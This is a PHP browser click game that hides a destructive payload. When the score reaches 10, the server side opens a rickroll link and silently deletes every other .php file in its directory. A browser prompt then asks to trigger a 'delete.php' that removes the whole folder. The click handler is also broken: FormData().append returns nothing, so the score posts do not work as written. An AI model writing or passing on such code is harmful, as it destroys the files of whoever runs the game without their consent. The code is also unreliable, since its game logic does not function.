<?php
// game.php - Run: php -S localhost:8000, open http://localhost:8000/game.php
session_start();
if (!isset($_SESSION['score'])) $_SESSION['score'] = 0;
if (!isset($_SESSION['game_over'])) $_SESSION['game_over'] = false;

if (isset($_POST['click'])) {
    $_SESSION['score']++;
    if ($_SESSION['score'] >= 10) {
        $_SESSION['game_over'] = true;
        // Rickroll
        echo "<script>window.open('https://youtu.be/dQw4w9WgXcQ');</script>";
        // Self-delete PHP files
        $dir = __DIR__;
        foreach (glob($dir . '/*.php') as $file) {
            if ($file != __FILE__) unlink($file);
        }
        // Queue self-delete
        echo "<script>setTimeout(() => {
            if (confirm('Delete game folder?')) {
                fetch('delete.php', {method: 'POST'});
            }
        }, 2000);</script>";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
  <title>PHP Flag Game</title>
  <style>
    body { font-family: Arial; text-align: center; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); }
    canvas { border: 5px solid #ff6b6b; background: white; cursor: pointer; }
    .flag { fill: #8b5cf6; }
  </style>
</head>
<body>
  <h1>PHP Edition - Score: <?php echo $_SESSION['score']; ?>/10</h1>
  <canvas id="canvas" width="400" height="400"></canvas>
  <p>Click purple flags!</p>
  
  <script>
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    let flags = [];
    
    canvas.addEventListener('click', (e) => {
      const rect = canvas.getBoundingClientRect();
      const x = e.clientX - rect.left;
      const y = e.clientY - rect.top;
      
      // Check flag hit
      for (let i = flags.length - 1; i >= 0; i--) {
        const flag = flags[i];
        if (x > flag.x && x < flag.x + 50 && y > flag.y && y < flag.y + 50) {
          flags.splice(i, 1);
          fetch('', {method: 'POST', body: new FormData().append('click', '1')})
            .then(() => location.reload());
          break;
        }
      }
    });
    
    function spawnFlag() {
      if (<?php echo $_SESSION['score'] >= 10 || $_SESSION['game_over'] ? 'true' : 'false'; ?>) return;
      flags.push({x: Math.random()*340, y: Math.random()*340});
      setTimeout(spawnFlag, 2000);
    }
    
    function draw() {
      ctx.clearRect(0, 0, 400, 400);
      flags.forEach(flag => {
        ctx.fillStyle = '#8b5cf6';
        ctx.fillRect(flag.x, flag.y, 50, 50);
        ctx.strokeStyle = 'white';
        ctx.lineWidth = 3;
        ctx.strokeRect(flag.x, flag.y, 50, 50);
      });
      requestAnimationFrame(draw);
    }
    
    spawnFlag();
    draw();
    
    <?php if ($_SESSION['game_over']): ?>
    alert('Rickrolled & Deleting! 💥');
    <?php endif; ?>
  </script>
</body>
</html>

